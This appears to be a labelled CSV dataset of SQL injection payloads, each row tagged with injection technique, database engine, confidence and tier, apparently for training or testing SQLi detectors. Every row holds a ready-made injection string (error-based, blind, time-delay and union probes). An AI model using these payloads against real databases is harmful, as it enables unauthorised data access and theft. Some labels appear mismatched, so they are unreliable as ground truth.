id,payload_norm,payload_delex,sqli_type,db_engine,confidence,source,tier,type_id
8562,"select * from users WHERE username = ""1\' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-7199\' or \'qibr\' = \'qibr""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,1.0,manual,gold,0
11476,"1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""asvy"" = ""asvy",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.85,manual,silver,1
4813,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#","- __INT__ % ' union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,mysql,1.0,manual,gold,3
16192,"1', ( select ( case when ( 6560 = 2813 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )","__INT__ , ( select ( case when ( __INT__ = __INT__ ) then __INT__ else cast ( __INT__ as __IDENT__ ) / ( select __INT__ from dual ) end ) from dual )",boolean_blind,oracle,1.0,manual,gold,1
4690,"-6184"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""rovr"" = ""rovr",- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,mssql,1.0,manual,gold,1
5242,"1"" where 1452 = 1452 union all select null,null,null,null--","__INT__ where __INT__ = __INT__ union all select null , null , null , null - -",union_based,generic,0.85,manual,silver,3
7727,"select * from users WHERE username = ""1"" and username = ""-5062 ) where 7457 = 7457 and username = ""-7072\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-2733\' ) ) ) and ( ( ( \'btjx\' = \'btjx""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ __STR__ ) ) ) and ( ( ( \ __STR__ = __IDENT__,error_based,oracle,1.0,manual,gold,0
1476,"-7884"" where 3297 = 3297 or 2492 = 6158",- __INT__ where __INT__ = __INT__ or __INT__ = __INT__,boolean_blind,generic,0.85,manual,silver,1
11839,"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and 'cotv' like 'cotv",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,generic,0.85,manual,silver,2
11511,"select * from users WHERE username = ""-9987 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( ( 8254 = 8254"" and username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",select * from __IDENT__ where __IDENT__ = __STR__ and ( ( __INT__ = __INT__ __STR__ __INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__,error_based,oracle,1.0,manual,gold,0
9582,"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""1 ) ) or username = ""-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ),error_based,oracle,1.0,manual,gold,0
15652,"1 ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )","__INT__ ) ( select ( case when ( __INT__ = __INT__ ) then __IDENT__ ( repeat ( left ( __IDENT__ ( char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) else char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) end ) from ( values ( __INT__ ) ) )",time_blind,mysql,0.85,manual,silver,2
8132,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) # igen","__INT__ and __INT__ = benchmark ( __INT__ , md5 ( __HEX__ ) ) # __IDENT__",time_blind,mysql,1.0,manual,gold,2
16076,"1"" ) ) ) union all select null,null,null#","__INT__ ) ) ) union all select null , null , null",union_based,generic,1.0,manual,gold,3
11579,"1"" where 2221 = 2221 and 5318 = 8398--",__INT__ where __INT__ = __INT__ and __INT__ = __INT__ - -,boolean_blind,generic,0.85,manual,silver,1
14394,"select * from users where id = 1 union select !<@,version ( ) -- 1","select * from __IDENT__ where __IDENT__ = __INT__ union select ! < __IDENT__ , version ( ) - - __INT__",union_based,generic,0.85,manual,silver,3
2089,"-3541"" or make_set ( 9354 = 9354,7185 ) and ""fgxu"" = ""fgxu",- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,mysql,0.85,manual,silver,1
1221,"-4669"" or 8571 = 8571--",- __INT__ or __INT__ = __INT__ - -,boolean_blind,generic,0.85,manual,silver,1
3431,"1 ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","__INT__ ) and __INT__ = benchmark ( __INT__ , md5 ( __HEX__ ) ) #",time_blind,mysql,1.0,manual,gold,2
12105,-9355' or ( 8459 = 8459 ) *4906 and 'aegf' = 'aegf,- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.85,manual,silver,1
16381,"-9057"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #","- __INT__ ) or __INT__ group by concat ( __HEX__ , ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) , __HEX__ , floor ( __IDENT__ ( __INT__ ) * __INT__ ) ) having min ( __INT__ ) #",error_based,mysql,1.0,manual,gold,0
2944,"1',iif ( 6625 = 6625,1,1/0 )","__INT__ , __IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",boolean_blind,generic,0.7,manual,bronze,1
5100,"select * from users WHERE username = ""1 ) ) ) or username = ""-8099%\' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ % \ __STR__ % \ __STR__ """,boolean_blind,oracle,1.0,manual,gold,1
15113,"1 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # kkmw","__INT__ and __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) # __IDENT__",boolean_blind,mssql,1.0,manual,gold,1
12594,"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156 and username = ""-5062 ) where 7457 = 7457 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,1.0,manual,gold,0
8115,"select * from users WHERE username = ""1\' and username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'yhku\' like \'yhku""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,postgresql,1.0,manual,gold,1
10795,"-3955%' ) ) union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#","- __INT__ % ' ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",time_blind,mysql,0.85,manual,silver,2
3465,1 ) where 9167 = 9167,__INT__ ) where __INT__ = __INT__,boolean_blind,generic,0.7,manual,bronze,1
9034,"select * from users WHERE username = ""-6353%\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-3613%\' ) and username = ""1\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ) ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,1.0,manual,gold,0
38,"1"" ) as jtou where 8129 = 8129 and 7533 = 7533--",__INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ - -,boolean_blind,generic,0.85,manual,silver,1
1938,1 ) ) and 7533 = 7533 and ( ( 8738 = 8738,__INT__ ) ) and __INT__ = __INT__ and ( ( __INT__ = __INT__,boolean_blind,generic,0.85,manual,silver,1
2068,"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and 'vunt' = 'vunt",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,mysql,1.0,manual,gold,2
5172,-2223' ) ) as mjwp where 8650 = 8650 or 7900 = 5838,- __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,boolean_blind,generic,0.7,manual,bronze,1
9527,"select * from users WHERE username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp"" or username = ""1\' ) and username = ""-2756\' where 6156 = 6156 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,1.0,manual,gold,0
10771,"1' ) and make_set ( 8403 = 8403,8899 ) and ( 'kyxl' = 'kyxl",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.85,manual,silver,0
8667,"select * from users WHERE username = ""-9295 ) ) ) and ( ( ( 8752 = 8752"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-6523"" and username = ""-7242\'",select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__ - __INT__ __STR__ - __INT__,error_based,oracle,1.0,manual,gold,0
11984,"select * from users WHERE username = ""-4952\' ) ) ) or username = ""-3733\' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'ybgd\' = \'ybgd""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,1.0,manual,gold,0
8054,"select * from users WHERE username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596","select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) __STR__ __INT__ and __IDENT__ = "" - __INT__ ) as __IDENT__ where __INT__ = __INT__",error_based,oracle,1.0,manual,gold,0
9898,"select * from users WHERE username = ""-1254"" and username = ""1 ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 9932 = 9932"" or username = ""-1985 ) ) ) and username = ""-7452\'",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ or __IDENT__ = __STR__ - __INT__,boolean_blind,postgresql,1.0,manual,gold,1
7110,"select * from users WHERE username = ""1 ) ) ) and ( ( ( 9401 = 9401"" or username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,1.0,manual,gold,0
2727,"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'rggg' = 'rggg",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.85,manual,silver,0
16327,"-3300' union all select 8979,8979,8979,8979,8979,8979--","- __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,1.0,manual,gold,3
8961,"select * from users WHERE username = ""1\'+ ( select \'iqxn\' where 1146 = 1146 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) +\'"" or username = ""-1889%\' ) ) ) and ( ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,boolean_blind,mssql,1.0,manual,gold,1
17639,"select * from users WHERE username = ""1\' ) ) and username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""-1254""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,boolean_blind,generic,0.7,manual,bronze,1
6125,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) ) +'","select benchmark ( __INT__ , md5 ( __HEX__ ) ) ) + '",time_blind,mysql,1.0,manual,gold,2
2287,1' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'hcpo' like 'hcpo,__INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,mssql,0.85,manual,silver,1
5792,"GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM]) GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])","__IDENT__ ( concat ( __STR__ , ( select ( __IDENT__ ( __IDENT__ = __IDENT__ , __INT__ ) ) ) , __STR__ ) , __IDENT__ ) __IDENT__ ( concat ( __STR__ , ( __IDENT__ ) , __STR__ ) , __IDENT__ )",boolean_blind,mysql,1.0,manual,gold,1
9045,"select * from users WHERE username = ""1\' ) where 1502 = 1502 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-9770\' ) ) as ovhh where 7903 = 7903",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) as __IDENT__ where __INT__ = __INT__,error_based,oracle,1.0,manual,gold,0
9330,"1%"" and 6408 = 7959--","__INT__ % "" and __INT__ = __INT__ - -",boolean_blind,generic,0.7,manual,bronze,1
12571,"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--","- __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,1.0,manual,gold,3
10250,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-3880 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 5194 = 5194""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and ( __INT__ = __INT__,error_based,oracle,1.0,manual,gold,0
12397,"1%"" ) ) or sleep ( 5 ) and ( ( ""%"" = """,__INT__ % __STR__ % __STR__,time_blind,mysql,1.0,manual,gold,2
5798,"1',iif ( 4861 = 6268,1,1/0 )","__INT__ , __IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",boolean_blind,generic,1.0,manual,gold,1
11254,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7720 ) )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ),error_based,oracle,1.0,manual,gold,0
6036,"select * from users WHERE username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and ( ( \'ajka\' = \'ajka"" or username = ""-1641\' ) ) or ( ( 5299 = 5299""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,1.0,manual,gold,0
